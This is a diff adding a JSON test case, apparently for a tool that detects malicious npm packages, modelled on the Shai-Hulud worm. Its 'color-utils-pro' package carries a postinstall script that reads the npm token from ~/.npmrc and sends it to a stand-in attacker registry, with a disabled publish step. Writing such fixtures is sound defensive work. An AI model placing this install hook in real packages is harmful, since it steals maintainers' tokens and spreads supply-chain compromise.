@@ -1,0 +1,21 @@
+{
+  "id": "npm-worm-republish",
+  "title": "Install script takes the npm token and republishes the maintainer's packages",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "packages",
+  "technique": "A postinstall script reads the npm token from ~/.npmrc, asks the registry who it belongs to, and publishes new versions of that maintainer's packages.",
+  "trigger": "npm install",
+  "incident": "Shai-Hulud 2.0 and Mini Shai-Hulud self-propagation (2025-2026)",
+  "sources": [
+    "https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/",
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-shai-hulud-ai-credential-expansion-2026090/"
+  ],
+  "notes": "Talks only to a reserved .invalid registry; the publish step sits behind a variable that is never set; prints PAH-CANARY.",
+  "files": {
+    "package.json": "{\n  \"name\": \"color-utils-pro\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"node scripts/postinstall.js\"\n  }\n}\n",
+    "scripts/postinstall.js": "const fs = require('fs'), os = require('os');\nconst { execSync } = require('child_process');\nconst rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\nconst token = (rc.match(/_authToken=(.+)/) || [])[1];\nfetch('https://registry.attacker.invalid/-/whoami', { headers: { authorization: 'Bearer ' + token } })\n  .then(() => { if (process.env.PAH_FIXTURE_NEVER_SET) execSync('npm publish --registry https://registry.attacker.invalid'); })\n  .catch(() => {});\nconsole.log('PAH-CANARY');\n",
+    "index.js": "module.exports = { rgb: (r, g, b) => `rgb(${r},${g},${b})` };\n",
+    "README.md": "# color-utils-pro\n"
+  }
+}
